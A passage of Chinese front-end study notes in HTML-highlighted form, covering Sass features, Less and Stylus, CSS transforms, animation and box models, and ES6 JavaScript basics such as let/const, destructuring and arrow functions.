class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-variable\">$bgColor</span>:<span class=\"hljs-number\">#fff</span>;\t\t<span class=\"hljs-comment\">//以$开头，表示全局和局部变量</span><br><span class=\"hljs-selector-tag\">div</span>&#123;<br>    <span class=\"hljs-variable\">$width</span>:<span class=\"hljs-number\">100px</span>;\t<span class=\"hljs-comment\">//局部变量</span><br>    <span class=\"hljs-attribute\">width</span>:<span class=\"hljs-variable\">$width</span>;<br>    <span class=\"hljs-attribute\">background</span>:<span class=\"hljs-variable\">$bgColor</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//变量用在属性中，需要写在#&#123;&#125;中</span><br><span class=\"hljs-variable\">$posi</span><span class=\"hljs-selector-pseudo\">:left</span>;<br><span class=\"hljs-selector-tag\">div</span>&#123;<br>    <span class=\"hljs-attribute\">border</span>-#&#123;<span class=\"hljs-variable\">$posi</span>&#125;:<span class=\"hljs-number\">1</span> px solid <span class=\"hljs-variable\">$color</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//默认变量，值后面加上 ！default</span><br><span class=\"hljs-variable\">$myLineHeight</span>:<span class=\"hljs-number\">1.5</span> !default;<br><br><span class=\"hljs-selector-tag\">body</span>&#123;<br>    <span class=\"hljs-attribute\">line-height</span>:<span class=\"hljs-variable\">$myLineHeight</span>;<br>&#125;<br><br><span class=\"hljs-selector-tag\">body</span>&#123;<br>    <span class=\"hljs-attribute\">line-height</span>:<span class=\"hljs-number\">1.5</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>CSS代码嵌套</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//在一个选择器中嵌套另一个选择器来实现继承，增强了sass文件的结构性和可读性；</span><br><span class=\"hljs-comment\">//选择器嵌套中，可以使用&amp;表示父元素选择器；</span><br><span class=\"hljs-selector-id\">#top_btn</span>&#123;<br>    <span class=\"hljs-attribute\">line-height</span>:<span class=\"hljs-number\">40px</span>;<br>    <span class=\"hljs-attribute\">text-transform</span>:capitalize;<br>    <span class=\"hljs-selector-tag\">li</span>&#123;<br>        <span class=\"hljs-attribute\">float</span><span class=\"hljs-selector-pseudo\">:left</span>;<br>    &#125;<br>    <span class=\"hljs-selector-tag\">a</span>&#123;<br>        <span class=\"hljs-attribute\">display</span>：block;<br>        <br>        &amp;<span class=\"hljs-selector-pseudo\">:hover</span>&#123;<br>            <span class=\"hljs-attribute\">color</span>:<span class=\"hljs-number\">#ddd</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-comment\">//属性嵌套</span><br><span class=\"hljs-selector-class\">.main-container</span>&#123;<br>    <span class=\"hljs-comment\">//选择器嵌套</span><br>    &amp;-<span class=\"hljs-attribute\">top</span>&#123;<br>        <span class=\"hljs-attribute\">color</span>:red;<br>    &#125;<br>    <span class=\"hljs-comment\">//伪类嵌套</span><br>    &amp;<span class=\"hljs-selector-pseudo\">:hover</span>&#123;<br>        <span class=\"hljs-attribute\">color</span>:green<span class=\"hljs-string\">&#x27;</span><br><span class=\"hljs-string\">    &#125;</span><br><span class=\"hljs-string\">&#125;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>混入Mixin</li>\n</ul>\n<blockquote>\n<p>Mixins是CSS预处理器最强大的特性；</p>\n<p>可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用；</p>\n</blockquote>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//无参数mixin</span><br><span class=\"hljs-keyword\">@mixin</span> center-block&#123;<br>    <span class=\"hljs-attribute\">margin-left</span>:auto;<br>    <span class=\"hljs-attribute\">margin-right</span>:auto;<br>&#125;<br><span class=\"hljs-selector-class\">.btn</span>&#123;<br>    <span class=\"hljs-keyword\">@include</span> center-block;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//有参数mixin</span><br><span class=\"hljs-keyword\">@mixin</span> theme(<span class=\"hljs-variable\">$theme</span>:Darkgray)&#123;<br>    <span class=\"hljs-attribute\">background</span>:<span class=\"hljs-variable\">$theme</span>;<br>    <span class=\"hljs-attribute\">box-shadow</span>:<span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1px</span> <span class=\"hljs-built_in\">rgba</span>(<span class=\"hljs-variable\">$theme</span>, .<span class=\"hljs-number\">25</span>);<br>    <span class=\"hljs-attribute\">color</span>:<span class=\"hljs-number\">#fff</span>;<br>&#125;<br><br><span class=\"hljs-selector-class\">.infor</span>&#123;<br>    <span class=\"hljs-keyword\">@include</span> theme;<br>&#125;<br><br><span class=\"hljs-selector-class\">.alert</span>&#123;<br>    <span class=\"hljs-keyword\">@include</span> theme(<span class=\"hljs-variable\">$theme</span>:Darkred);<br>&#125;<br><br><span class=\"hljs-comment\">//多个mixin,多个参数以逗号分隔，如果@include传入的参数个数小于@mixin定义参数的个数，则按照顺序表示，后面不足的使用默认值；如果不足的没有默认值则报错；</span><br><span class=\"hljs-keyword\">@mixin</span> theme(<span class=\"hljs-variable\">$theme</span>:Darkgray,<span class=\"hljs-variable\">$color</span>:red)&#123;<br>    <span class=\"hljs-attribute\">background</span>:<span class=\"hljs-variable\">$theme</span>;<br>    <span class=\"hljs-attribute\">box-shadow</span>:<span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1px</span> <span class=\"hljs-built_in\">rgba</span>(<span class=\"hljs-variable\">$theme</span>, .<span class=\"hljs-number\">25</span>);<br>    <span class=\"hljs-attribute\">color</span>:<span class=\"hljs-variable\">$red</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//模块系统</span><br><span class=\"hljs-comment\">//test.scss</span><br><span class=\"hljs-variable\">$font-stack</span>: Helvetica, sans-serif;<br><span class=\"hljs-variable\">$primary-color</span>: <span class=\"hljs-number\">#333</span>;<br><br><span class=\"hljs-selector-tag\">body</span> &#123;<br>  <span class=\"hljs-attribute\">font</span>: <span class=\"hljs-number\">100%</span> <span class=\"hljs-variable\">$font-stack</span>;<br>  <span class=\"hljs-attribute\">color</span>: <span class=\"hljs-variable\">$primary-color</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//styles.scss</span><br><span class=\"hljs-comment\">// 使用@use导入文件</span><br><span class=\"hljs-keyword\">@use</span> <span class=\"hljs-string\">&#x27;test&#x27;</span>; <span class=\"hljs-comment\">// 生成了一个 test 命名空间</span><br><br><span class=\"hljs-selector-class\">.inverse</span> &#123;<br>  <span class=\"hljs-attribute\">background-color</span>: test.<span class=\"hljs-variable\">$primary-color</span>;<br>  <span class=\"hljs-attribute\">color</span>: white;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>继承</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">/* This CSS will print because %message-shared is extended. */</span><br>%message-shared &#123;<br>  <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">1px</span> solid <span class=\"hljs-number\">#ccc</span>;<br>  <span class=\"hljs-attribute\">padding</span>: <span class=\"hljs-number\">10px</span>;<br>  <span class=\"hljs-attribute\">color</span>: <span class=\"hljs-number\">#333</span>;<br>&#125;<br><br><span class=\"hljs-comment\">// This CSS won&#x27;t print because %equal-heights is never extended.</span><br>%equal-heights &#123;<br>  <span class=\"hljs-attribute\">display</span>: flex;<br>  <span class=\"hljs-attribute\">flex-wrap</span>: wrap;<br>&#125;<br><br><span class=\"hljs-selector-class\">.message</span> &#123;<br>  <span class=\"hljs-keyword\">@extend</span> %message-shared;<br>&#125;<br><br><span class=\"hljs-selector-class\">.success</span> &#123;<br>  <span class=\"hljs-keyword\">@extend</span> %message-shared;<br>  <span class=\"hljs-attribute\">border-color</span>: green;<br>&#125;<br><br><span class=\"hljs-selector-class\">.error</span> &#123;<br>  <span class=\"hljs-keyword\">@extend</span> %message-shared;<br>  <span class=\"hljs-attribute\">border-color</span>: red;<br>&#125;<br><br><span class=\"hljs-selector-class\">.warning</span> &#123;<br>  <span class=\"hljs-keyword\">@extend</span> %message-shared;<br>  <span class=\"hljs-attribute\">border-color</span>: yellow;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>函数</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\">x <span class=\"hljs-keyword\">@use</span> <span class=\"hljs-string\">&quot;sass:math&quot;</span>;<br><br><span class=\"hljs-selector-class\">.container</span>&#123;<br>    <span class=\"hljs-attribute\">display</span>:flex;<br>&#125;<br><br><span class=\"hljs-selector-tag\">article</span><span class=\"hljs-selector-attr\">[role=<span class=\"hljs-string\">&quot;main&quot;</span>]</span>&#123;<br>    <span class=\"hljs-attribute\">width</span>:math.<span class=\"hljs-built_in\">div</span>(<span class=\"hljs-number\">600px</span>,<span class=\"hljs-number\">960px</span>)*<span class=\"hljs-number\">100%</span>;<br>&#125;<br><br><span class=\"hljs-selector-tag\">aside</span><span class=\"hljs-selector-attr\">[role=<span class=\"hljs-string\">&quot;complementary&quot;</span>]</span>&#123;<br>    <span class=\"hljs-attribute\">width</span>:math.<span class=\"hljs-built_in\">div</span>(<span class=\"hljs-number\">300px</span>,<span class=\"hljs-number\">960px</span>)*<span class=\"hljs-number\">100%</span>;<br>    <span class=\"hljs-attribute\">margin-left</span>:auto;<br>&#125;<br><span class=\"hljs-comment\">//支持加减乘除，循环等；</span><br></code></pre></td></tr></table></figure>\n\n<p>缺点：采用Ruby语言编写，单独使用妹有问题，但是工程化项目中，存在问题；</p>\n<ul>\n<li>需要借助node-sass,node版本与node-sass版本相关联，一旦本地nodeJS升级，出现node-sass无法工作；（Rebuild或者冲洗安装node-sass）</li>\n<li>需要node-gyp作为先决条件-&gt;需要兼容版本的python；</li>\n<li>binding.node源无法访问或者速度慢；</li>\n</ul>\n<h5 id=\"Less\"><a href=\"#Less\" class=\"headerlink\" title=\"Less\"></a>Less</h5><p>Less是CSS预处理语言，拓展了CSS，增加了变量、Mixin、函数等特性；使CSS更易维护和拓展。Less可以运行在Node或浏览器端；</p>\n<h5 id=\"Stylus\"><a href=\"#Stylus\" class=\"headerlink\" title=\"Stylus\"></a>Stylus</h5><p>Stylus是一种创新的样式表语言，可编译为CSS。Stylus是用nodeJS构建的；</p>\n<h3 id=\"3-多屏适应，自适应布局和响应式布局区别\"><a href=\"#3-多屏适应，自适应布局和响应式布局区别\" class=\"headerlink\" title=\"3.多屏适应，自适应布局和响应式布局区别\"></a>3.多屏适应，自适应布局和响应式布局区别</h3><h3 id=\"4-过渡动画\"><a href=\"#4-过渡动画\" class=\"headerlink\" title=\"4.过渡动画\"></a>4.过渡动画</h3><ul>\n<li>transform（平移旋转缩放）</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">.&#123;<br>    translate(<span class=\"hljs-number\">50px</span>,<span class=\"hljs-number\">100px</span>);\t\t\t<span class=\"hljs-comment\">/*平移，x y方向*/</span><br>    rotate(<span class=\"hljs-number\">20deg</span>);\t\t\t\t\t<span class=\"hljs-comment\">/*旋转 顺时针旋转20°*/</span><br>    rotateX(<span class=\"hljs-number\">150deg</span>);\t\t\t\t\t<span class=\"hljs-comment\">/*x轴旋转*/</span><br>    scaleX(<span class=\"hljs-number\">2</span>);\t\t\t<span class=\"hljs-comment\">/*增大两倍宽度*/</span><br>    scale(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>);\t\t\t\t<span class=\"hljs-comment\">/*宽度一赔，高度两倍*/</span><br>    <br>&#125;<br></code></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>animation</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">*<span class=\"hljs-attribute\">animation-name</span>：关键帧的名字，该参数必需。<br>*<span class=\"hljs-attribute\">animation-duration</span>：动画持续的时间，该参数必需。<br><span class=\"hljs-attribute\">animation-timing-function</span>：定时器函数，默认是ease。<br><span class=\"hljs-attribute\">animation-delay</span>：动画效果多少秒后开始，默认为<span class=\"hljs-number\">0</span>。<br><span class=\"hljs-attribute\">animation-iteration-count</span>：动画重复的次数，可以指定为一个整数，表示多少次，默认值是infinite关键字，表示无限次。<br><span class=\"hljs-attribute\">animation-direction</span>：动画方向，可能的值为forward、backward或alternating，默认值为<span class=\"hljs-attribute\">normal</span>。<br><span class=\"hljs-attribute\">animation-fill-mode</span>：默认值为<span class=\"hljs-attribute\">none</span>。<br><span class=\"hljs-attribute\">animation-play-state</span>：动画默认是否生效，默认值为running。<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><code>animation</code> 强调流程与控制，对元素的一个或多个属性的变化进行控制，可以有多个<a href=\"https://so.csdn.net/so/search?q=%E5%85%B3%E9%94%AE%E5%B8%A7&spm=1001.2101.3001.7020\">关键帧</a>（<code>animation</code> 和 <code>@keyframes</code>结合使用）</li>\n<li><code>transition</code> 强调过渡，是元素的一个或多个属性发生变化时产生的过渡效果，同一个元素通过两个不同的途径获取样式；</li>\n</ul>\n<h3 id=\"5-标准盒模型和怪异盒模型\"><a href=\"#5-标准盒模型和怪异盒模型\" class=\"headerlink\" title=\"5.标准盒模型和怪异盒模型\"></a>5.标准盒模型和怪异盒模型</h3><p>W3C标准盒子模型由：content、margin、padding、border组成；</p>\n<h5 id=\"区别：总宽度的计算公式不一样\"><a href=\"#区别：总宽度的计算公式不一样\" class=\"headerlink\" title=\"区别：总宽度的计算公式不一样\"></a>区别：总宽度的计算公式不一样</h5><p>标准盒模型总宽度=width+margin（左右）+padding（左右）+border（左右）；</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201224112703410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>怪异盒模型总宽度=width+margin（左右）（width已经包含padding和border的值）；</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201224113002950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">    <span class=\"hljs-selector-class\">.box</span> &#123;<br>        <span class=\"hljs-attribute\">margin</span>: <span class=\"hljs-number\">30px</span>;<br>        <span class=\"hljs-attribute\">padding</span>: <span class=\"hljs-number\">20px</span>;<br>        <span class=\"hljs-attribute\">width</span>: <span class=\"hljs-number\">80px</span>;<br>        <span class=\"hljs-attribute\">height</span>: <span class=\"hljs-number\">40px</span>;<br>        <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">10px</span> solid <span class=\"hljs-number\">#00007e</span>;<br>        <span class=\"hljs-attribute\">background</span>: <span class=\"hljs-number\">#fec997</span>;<br>        <span class=\"hljs-attribute\">box-sizing</span>: border-box <span class=\"hljs-comment\">/* 设置盒子类型 */</span><br>      &#125;<br><br><span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\">\tcontent-box:标准盒模型；</span><br><span class=\"hljs-comment\">\tborder-box:怪异盒模型；</span><br><span class=\"hljs-comment\">\tpadding-box:盒子宽度等于content+padding;</span><br><span class=\"hljs-comment\">\tinherit:从父元素继承box-sizeing的属性；</span><br><span class=\"hljs-comment\">*/</span><br><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"三、JS\"><a href=\"#三、JS\" class=\"headerlink\" title=\"三、JS\"></a>三、JS</h2><h3 id=\"1-基本数据类型\"><a href=\"#1-基本数据类型\" class=\"headerlink\" title=\"1.基本数据类型\"></a>1.基本数据类型</h3><ul>\n<li>基本数据类型</li>\n</ul>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs typescript\"><span class=\"hljs-built_in\">number</span>,<span class=\"hljs-built_in\">string</span>,<span class=\"hljs-literal\">undefined</span>,<span class=\"hljs-title class_\">Boolean</span>,<span class=\"hljs-literal\">null</span>;<br><span class=\"hljs-title class_\">ES6</span>添加：<span class=\"hljs-title class_\">Symbol</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>复杂数据类型</li>\n</ul>\n<figure class=\"highlight coffeescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs coffeescript\"><span class=\"hljs-built_in\">Object</span>；<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>0.1+0.2！=0.3</p>\n<p>浮点数值的最高精度事28位小数，0.1+0.2= 0.30000 0000 0000 0004</p>\n<p>基于IEEE754数值的浮点计算通病；</p>\n</blockquote>\n<h3 id=\"2-ES6新特性\"><a href=\"#2-ES6新特性\" class=\"headerlink\" title=\"2.ES6新特性\"></a>2.ES6新特性</h3><blockquote>\n<p>ES6=ES2015</p>\n</blockquote>\n<ul>\n<li>新增块级作用域let,const;</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//let </span><br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">var</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">5</span>;i++)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(i);<br>&#125;<br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(i+<span class=\"hljs-number\">1</span>);\t\t\t<span class=\"hljs-comment\">//循环体外部能够访问i，使用let不会</span><br><br><span class=\"hljs-comment\">//const声明的是常量，不能被修改；</span><br><span class=\"hljs-keyword\">const</span> a=<span class=\"hljs-number\">1</span>;<br><br><span class=\"hljs-comment\">//const 声明的数组不可以被重新赋值，但是可以修改元素；</span><br><span class=\"hljs-keyword\">const</span> names=[<span class=\"hljs-string\">&quot;A&quot;</span>,<span class=\"hljs-string\">&quot;B&quot;</span>];<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>定义类的语法糖；</li>\n<li>新增基本数据类型Symbol；</li>\n<li>新增变量解构赋值；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//数组</span><br><span class=\"hljs-keyword\">let</span> arr=[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>]<br><span class=\"hljs-keyword\">const</span> [x,y,z]=arr;<br><br><span class=\"hljs-comment\">//对象</span><br><span class=\"hljs-keyword\">const</span> person=&#123;<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">22</span>,<br>    <span class=\"hljs-attr\">languages</span>:[<span class=\"hljs-string\">&#x27;Java&#x27;</span>,<span class=\"hljs-string\">&#x27;Python&#x27;</span>]<br>&#125;;<br><br><span class=\"hljs-keyword\">const</span> &#123;<span class=\"hljs-attr\">name</span>:n,<span class=\"hljs-attr\">age</span>:a,<span class=\"hljs-attr\">language</span>:l&#125;=person;<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(n,a,l);<br></code></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>函数参数允许默认值，引入rest参数，新增箭头函数；</li>\n</ul>\n<p><a href=\"https://blog.csdn.net/sinat_41696687/article/details/121903414\">https://blog.csdn.net/sinat_41696687/article/details/121903414</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// =&gt;不只是function的简写，还有其他优点：和包围他的代码公用this，解决了this指向问题；原理是补获上下文的this；</span><br><span class=\"hljs-comment\">//如果箭头函数的外层有普通函数，this指向普通函数的this；</span><br><span class=\"hljs-comment\">//妹有普通函数，this指向全局变量</span><br><span class=\"hljs-comment\">//有</span><br><span class=\"hljs-keyword\">let</span> obj = &#123;<br>  <span class=\"hljs-attr\">fn</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>      <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;我是普通函数&#x27;</span>,<span class=\"hljs-variable language_\">this</span> === obj)   <span class=\"hljs-comment\">// true</span><br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-function\">()=&gt;</span>&#123;<br>          <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;我是箭头函数&#x27;</span>,<span class=\"hljs-variable language_\">this</span> === obj) <span class=\"hljs-comment\">// true</span><br>      &#125;<br>  &#125;<br>&#125;<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(obj.<span class=\"hljs-title function_\">fn</span>()())<br><br><span class=\"hljs-comment\">//妹有</span><br><span class=\"hljs-keyword\">let</span> obj = &#123;<br>    <span class=\"hljs-attr\">fn</span>:<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span> === <span class=\"hljs-variable language_\">window</span>);<br>    &#125;<br>&#125;<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(obj.<span class=\"hljs-title function_\">fn</span>())<br><span class=\"hljs-comment\">// true</span><br><br><span class=\"hljs-comment\">//默认值</span><br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">a,b=<span class=\"hljs-number\">1</span></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> a+b;<br>&#125;<br><br><span class=\"hljs-comment\">//箭头函数是匿名函数，不能作为构造函数，不可以使用new；</span><br><br><span 